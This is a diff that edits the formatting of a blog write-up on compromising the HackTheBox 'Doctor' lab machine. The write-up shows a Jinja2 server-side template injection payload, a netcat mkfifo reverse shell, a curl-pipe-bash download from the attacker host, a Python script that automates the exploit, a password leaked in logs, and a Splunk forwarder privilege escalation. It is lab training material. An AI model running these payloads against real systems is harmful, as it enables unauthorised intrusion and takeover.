@@ -21,7 +21,7 @@ Starting to posting about some write-ups of CTF-like machines, the first one wil
 
 So let's start with a quick enumeration of this box using `nmap`. Running a quick scan we received the following output, where 2 HTTP services were found, alongside a SSH port:
 
-```
+```bash
 nmap -sC -sV -Pn -oA quick 10.10.10.209
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 19:46 -03
@@ -118,7 +118,7 @@ Accessing the posted message afterwards, I noticed that it redirects to `http://
 
 Manipulating the url, to try to access the other posts, eg /post/1, there was an message from user `admin` but also didn't took me nowhere else.
 
-Things get interesting when I decided to access `/archive` again, where the content used in the message is displayed, allowing us to test some Server-Side Template Injection (SSTI) and possibly get a reverse shell. 
+Things get interesting when I decided to access `/archive` again, where the content used in the message is displayed, allowing us to test some Server-Side Template Injection (SSTI) and possibly get a reverse shell.
 
 In order to confirm this, following the guidance available on [SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify) I've changed the Title from my previous message in order to test some types of injections and determine the engine used, which will help us define the malicious injection itself.
 
@@ -128,11 +128,9 @@ This injection worked flawlessly, indicating that we're handling Twig or Jinja2 
 
 ![image-20210115111818436](https://i.imgur.com/EH0zQHN.png){: .align-center}
 
+After a few tests, playing with the examples available at [PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection), I was able to confirm that the correct language to use would be **Jinja2**, once the content below worked properly, among others:
 
-
-After a few tests, playing with the examples available at [PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection), I was able to confirm that the correct language to use would be **Jinja2**, once the content below worked properly, among others:
-
-```
+```python
 {% raw %}{{config.items()}}{% endraw %}
 ```
 
@@ -142,31 +140,31 @@ After confirming that a Jinja2 payload should be used, would be possible to get 
 
 - In a folder in the attacker machine, created a payload file containing the string to be used as payload to get a reverse shell.
 
-  ```
+  ```bash
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
   ```
   
 - Then hosted a http server using python3 by running the command below from the same directory as the recently created file.
 
-  ```
-    sudo python3 -m http.server 80
+  ```bash
+  sudo python3 -m http.server 80
   ```
   
 - On the portal, created a post containing the following string on the title, obtained from previously mentioned PayloadsAllTheThings site. This one specially is very interesting for this situation, which allows us to get the **input** parameter from the GET request, so we would be able to change the commands to be issue to the system very easily.
 
-  ```
+  ```python
   {% raw %}{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}{% endraw %}
   ```
   
 - Started listener using netcat by running the command below, selecting the same port defined in the payload file.
 
-  ```
+  ```bash
   nc -lnvp 4443
   ```
 
 - Then made a request to the portal using the archive url appended by the command I wanted to execute.
 
-  ```
+  ```bash
   http://doctors.htb/archive?input=curl%20-L%20http://10.10.10.10/payload%20|%20bash
   ```
 
@@ -204,7 +202,7 @@ r = s.post(url+'/login?next=%2Fhome',data=payload)
 
 # Create message
 {% raw %}
-title = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__bu	iltins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}"
+title = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}"
 {% endraw %}
 payload = {'title':title,'content':'content','submit':'Post'}
 r = s.post(url+'/post/new',data=payload)
@@ -213,9 +211,8 @@ r = s.post(url+'/post/new',data=payload)
 command = requests.utils.quote('curl -L http://'+ip+'/payload | bash')
 r = s.get(url+'/archive?input='+command)
 ```
-## User flag
 
-### Enumeration
+## User flag
 
 After getting a reverse shell, [I have upgraded it](https://blog.mrtnrdl.de/infosec/2019/05/23/obtain-a-full-interactive-shell-with-zsh.html) and then started to enumerate box:
 
@@ -223,12 +220,12 @@ After getting a reverse shell, [I have upgraded it](https://blog.mrtnrdl.de/info
 
 - Checking the groups that the current user **web** is member, we notice that this account is member of group **adm**
 
-  ```
+  ```bash
   web@doctor:/home$ id
   uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
   ```
 
-  - The **adm** group on Linux systems grants access to files located at `/var/log`, which will possibly allow us to find some sensitive information in the logs from webservices or other tasks. 
+  - The **adm** group on Linux systems grants access to files located at `/var/log`, which will possibly allow us to find some sensitive information in the logs from webservices or other tasks.
 
 ### Analyzing log files under /var/log
 
@@ -285,7 +282,7 @@ total 7980
 
 Checking its contents, looking for the Query strings of the logged requests, we have observed an interesting entry, as below, which leaks a possible password **Guitar123**
 
-```
+```bash
 web@doctor:/var/log/apache2$ awk -F" " '{print $7}' backup | sort | uniq
 /
 12.1.2\n"
@@ -310,7 +307,7 @@ web@doctor:/var/log/apache2$ awk -F" " '{print $7}' backup | sort | uniq
 
 As the existing user in the box is **shaun**, trying to change user using this credential turned out to be successful, which allowed us to get the user flag:
 
-```
+```bash
 shaun@doctor:~$ ls -la
 total 44
 drwxr-xr-x 6 shaun shaun 4096 Sep 15 12:51 .
@@ -331,11 +328,9 @@ shaun@doctor:~$ cat user.txt
 
 ## Root flag
 
-### Enumeration
-
 Now running as shaun, noticed that he's unable to run commands using sudo.
 
-```
+```bash
 shaun@doctor:/tmp$ sudo -l
 [sudo] password for shaun: 
 Sorry, user shaun may not run sudo on d
@@ -347,11 +342,7 @@ After browsing it directly, once I have clicked in the **services** link, as ima
 
 ![image-20210131080459535](https://i.imgur.com/R4VNKDe.png)
 
-
-
 ![image-20210131080540525](https://i.imgur.com/lsTJ2cg.png)
-
-
 
 As we have credentials to logon to the Splunk Service, the next step is to find a way to get an RCE on this service. Doing some research I came across [Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper's Blog](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) that mentions [GitHub - cnotin/SplunkWhisperer2: Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations](https://github.com/cnotin/SplunkWhisperer2), which is a tool that makes easier to get a command execution from the access we already have.
 
@@ -379,12 +370,11 @@ Bye!
 
 From the reverse shell obtained, was able to get the content from `/root/root.txt` without problems
 
-```
+```bash
 # cat /root/root.txt
 <redacted>
 ```
 
-I hope it was somehow useful! 
+I hope it was somehow useful!
 
 See you in the next post! :smile:
-
